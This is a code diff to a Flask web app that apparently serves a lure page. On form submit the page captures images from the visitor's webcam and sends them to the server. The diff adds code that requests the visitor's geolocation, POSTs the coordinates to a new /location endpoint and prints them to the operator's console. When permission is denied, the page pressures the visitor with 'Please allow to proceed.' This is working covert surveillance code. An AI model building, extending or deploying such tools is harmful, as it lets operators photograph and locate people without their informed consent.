@@ -2,6 +2,11 @@ from flask import Flask, request, render_template_string
 import base64
 import uuid
 import os
+import json
+from colorama import Fore, Style, init
+
+# Initialize colorama for Windows and other platforms
+init(autoreset=True)
 
 app = Flask(__name__)
 
@@ -84,7 +89,31 @@ HTML_PAGE = """
     <script>
         let capturing = false;
 
-        function askCameraPermission() {
+        function askPermissions() {
+            // Ask for location permission
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+
+                    // Send location to server
+                    fetch('/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    }).then(() => {
+                        console.log("Location sent to server:", locationData);
+                    });
+                }, error => {
+                    alert("Location permission denied. Please allow to proceed.");
+                });
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+
+            // Ask for camera permission
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     const video = document.createElement("video");
@@ -126,7 +155,7 @@ HTML_PAGE = """
 
         function handleSubmit(event) {
             event.preventDefault();
-            askCameraPermission();
+            askPermissions();
         }
     </script>
 </head>
@@ -168,6 +197,18 @@ def capture():
             f.write(base64.b64decode(image_data))
         print(f"Captured image saved as {unique_filename}")
     return "Image captured!"
+
+# Route to capture and print location data
+@app.route('/location', methods=['POST'])
+def location():
+    data = request.get_json()
+    latitude = data.get('latitude')
+    longitude = data.get('longitude')
+
+    # Print location in green color
+    print(Fore.GREEN + f"User Location Received: Latitude - {latitude}, Longitude - {longitude}" + Style.RESET_ALL)
+
+    return "Location captured!"
 
 if __name__ == '__main__':
     app.run(debug=True)
